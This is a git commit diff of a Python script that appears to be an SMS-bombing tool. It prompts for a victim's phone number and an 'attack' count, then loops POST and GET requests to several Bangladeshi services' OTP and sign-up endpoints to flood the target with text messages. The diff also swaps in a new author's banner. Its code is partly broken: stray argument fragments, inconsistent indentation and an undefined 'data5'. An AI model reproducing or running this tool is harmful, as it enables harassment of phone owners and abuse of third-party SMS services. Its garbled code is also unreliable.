2621ffaa16562f08a7987b851e7530baac6d877a
Damageattack <98615310+Damageattack@users.noreply.github.com>
2022-02-03 14:42:19 +0600

    Add files via upload

--- newfile.py
+++ newfile.py
@@ -3,72 +3,18 @@ from requests.structures import CaseInsensitiveDict
 
 green = '\033[1;32m'
 end = '\033[0m'
-print (green+"""  _______ _    _ _  _____                                         
- |__   __| |  | (_)/ ____|                                        
-    | |  | |__| |_| (___                                          
-    | |  |  __  | |\___ \                                         
-    | |  | |  | | |____) |                                        
-   _|_|_ |_|  |_|_|_____/____   __  __                            
-  / ____|      / ____|__   __| |  \/  |                           
- | (___  _   _| (___    | | ___| \  / |                           
-  \___ \| | | |\___ \   | |/ _ \ |\/| |                           
-  ____) | |_| |____) |  | |  __/ |  | |                           
- |_____/ \__, |_____/___|_|\___|_|  |_|                           
-  / ____| __/ |     |__   __|                                     
- | |     |___/___  __ _| | ___  _ __                              
- | |    | '__/ _ \/ _` | |/ _ \| '__|                             
- | |____| | |  __/ (_| | | (_) | |                                
-  \_____|_|  \___|\__,_|_|\___/|_|                                
- |  _ \                                                           
- | |_) |_   _                                                     
- |  _ <| | | |                                                    
- | |_) | |_| |                                                    
- |____/ \__, |                                                    
-         __/ |                                                    
-   __  _|___/ _____         _____ _    _       _  ___ ____   __   
-  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \  
- | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | | 
- | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | | 
- | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | | 
- | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | | 
-  \_\                                                        /_/  
-                                                                  """+end)
+print (green+"""   _ ______         __      __  __  
+  (_)_  __/__   __ / /__  __\ \/ /  
+ / / / / (_-<  / // / _ \/ _ \  /   
+/_/ /_/ /___/  \___/\___/_//_/_/    """+end)
 
-# CVALUE
-blue = '\33[94m'
-lightblue = '\033[94m'
-red = '\033[91m'
-white = '\33[97m'
-yellow = '\33[93m'
-green = '\033[1;32m'
-cyan = "\033[96m"
-end = '\033[0m'
-print ("\033[32m")
-
-print ("	 -!-!- WeLcOmE-!-!- ( HD-SHaKiiB ) ( GhOsToFKiinG ) ")
-
-
-print ("""
-
-
-   ╔═════════════════════════════════╗
-   ║ AuTHor   : SHaKiiB ツ           ║
-   ║ FaCeBooK : iTzSHaKiiB           ║
-   ║ GitHuB   : iTzSHaKiB            ║
-   ╚═════════════════════════════════╝
-
-
-
-
-""")
-
-number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))
+number  = str(input("[>] Heii Mr : JonY Sir. apNar aTTack NumBer DiN: "))
 
 
 amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))
 
 
-url1 = "https://api.meenaclick.com/api/front/sms/send/pin?cell_phone=8801612153912&type=sign-up"
+url1 = "https://api.meenaclick.com/api/front/sms/send/pin?cell_phone=88"+number+"&type=sign-up"
 
 headers1 = CaseInsensitiveDict()
 headers1["Content-Type"] = "application/json"
@@ -95,6 +41,11 @@ headers4 = CaseInsensitiveDict()
 headers4["Content-Type"] = "application/json;charset=UTF-8"
 headers4["x-deviceid"] = "web-d881a3b625c9fbbcaa2ae2ac2c8bb061"
 
+url5 = "https://bd.mybi.ma/apigw/1.1/send-otp"
+
+headers5 = CaseInsensitiveDict()
+headers["Content-Type"] = "application/json; charset=utf-8"
+
 data4 = """{
   \"data\": {
     \"user\": {
@@ -117,8 +68,11 @@ for i in range(amount):
 		resp2 = requests.post(url2, headers=headers2, data=data2)
 
 		resp3 = requests.get(url3)
+headers=headers3,  data=data3)
 
-		resp4 = requests.post(url4, headers=headers4,  data=data4)
+   resp4 = requests.post(url4, headers=headers4,  data=data4)
+
+		resp5 = requests.post(url4, headers=headers4,  data=data5)
 
 		print(str (i+1)+" Damage \n")
 
